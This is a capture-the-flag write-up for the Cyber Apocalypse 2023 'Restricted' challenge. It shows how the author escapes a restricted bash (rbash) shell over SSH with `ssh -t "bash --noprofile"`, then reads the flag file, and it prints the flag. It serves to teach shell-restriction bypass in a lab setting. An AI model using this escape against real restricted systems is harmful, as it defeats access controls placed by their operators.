# Restricted

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

You 're still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment ?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319141257.png)

## Find the flag

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/Misc/Restricted/misc_restricted.zip):**
```
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Misc/Restricted)-[2023.03.19|14:09:38(HKT)]
└> file misc_restricted.zip    
misc_restricted.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Misc/Restricted)-[2023.03.19|14:09:40(HKT)]
└> unzip misc_restricted.zip 
Archive:  misc_restricted.zip
   creating: misc_restricted/
  inflating: misc_restricted/Dockerfile  
  inflating: misc_restricted/build_docker.sh  
   creating: misc_restricted/src/
 extracting: misc_restricted/src/bash_profile  
 extracting: misc_restricted/src/flag.txt  
  inflating: misc_restricted/src/sshd_config  
```

**In `Dockerfile` we see there's a system user called `restricted`:**
```shell
RUN adduser --disabled-password restricted
RUN usermod --shell /bin/rbash restricted
```

And it has no password.

However, **it's shell is using `rbash` or Restricted Bash shell.**

**Now, let's SSH into that user:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Misc/Restricted/misc_restricted)-[2023.03.19|14:09:54(HKT)]
└> ssh -p 31396 restricted@104.248.169.117      
[...]
restricted@ng-restricted-dqzzd-597f4d9c45-wkcbz:~$ echo $SHELL
/bin/rbash
restricted@ng-restricted-dqzzd-597f4d9c45-wkcbz:~$ env
-rbash: env: command not found
restricted@ng-restricted-dqzzd-597f4d9c45-wkcbz:~$ echo $PATH
/home/restricted/.bin
```

As you can see, it's pretty restricted. However, there're a lot of ways can bypass that shell.

**If you Google "rbash escape", you'll find [this Gist](https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319141613.png)

**That being said, we can use the `-t` flag in `ssh` to spawn a `bash` shell:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Misc/Restricted/misc_restricted)-[2023.03.19|14:11:49(HKT)]
└> ssh -p 31396 restricted@104.248.169.117 -t "bash --noprofile"
restricted@ng-restricted-dqzzd-597f4d9c45-wkcbz:~$ id
uid=1000(restricted) gid=1000(restricted) groups=1000(restricted)
restricted@ng-restricted-dqzzd-597f4d9c45-wkcbz:~$ echo $SHELL
/bin/rbash
```

Although the `$SHELL` environment variable said it's `rbash`, we can execute a normal Bash shell commands.

**Let's read the flag!**
```shell
restricted@ng-restricted-dqzzd-597f4d9c45-wkcbz:~$ cd ../..
restricted@ng-restricted-dqzzd-597f4d9c45-wkcbz:/$ ls -lah
total 100K
drwxr-xr-x   1 root root 4.0K Mar 19 06:09 .
drwxr-xr-x   1 root root 4.0K Mar 19 06:09 ..
drwxr-xr-x   1 root root 4.0K Mar 16 16:10 bin
drwxr-xr-x   2 root root 4.0K Dec  9 19:15 boot
drwxr-xr-x   5 root root  360 Mar 19 06:09 dev
drwxr-xr-x   1 root root 4.0K Mar 19 06:09 etc
-rwxr-xr-x   1 root root   32 Mar 16 16:15 flag_8dpsy
drwxr-xr-x   1 root root 4.0K Mar 16 16:10 home
drwxr-xr-x   1 root root 4.0K Mar 16 16:10 lib
drwxr-xr-x   2 root root 4.0K Feb 27 00:00 lib64
drwxr-xr-x   2 root root 4.0K Feb 27 00:00 media
-rwxr-xr-x   1 root root  12K Mar 15 21:39 memories.dump
drwxr-xr-x   2 root root 4.0K Feb 27 00:00 mnt
drwxr-xr-x   2 root root 4.0K Feb 27 00:00 opt
dr-xr-xr-x 283 root root    0 Mar 19 06:09 proc
drwx------   2 root root 4.0K Feb 27 00:00 root
drwxr-xr-x   1 root root 4.0K Mar 19 06:12 run
drwxr-xr-x   1 root root 4.0K Mar 16 16:10 sbin
drwxr-xr-x   2 root root 4.0K Feb 27 00:00 srv
dr-xr-xr-x  13 root root    0 Mar 19 06:09 sys
drwxrwxrwt   1 root root 4.0K Mar 16 16:10 tmp
drwxr-xr-x   1 root root 4.0K Feb 27 00:00 usr
drwxr-xr-x   1 root root 4.0K Feb 27 00:00 var
restricted@ng-restricted-dqzzd-597f4d9c45-wkcbz:/$ cat flag_8dpsy 
HTB{r35tr1ct10n5_4r3_p0w3r1355}
```

- **Flag: `HTB{r35tr1ct10n5_4r3_p0w3r1355}`**

## Conclusion

What we've learned:

1. RBash escape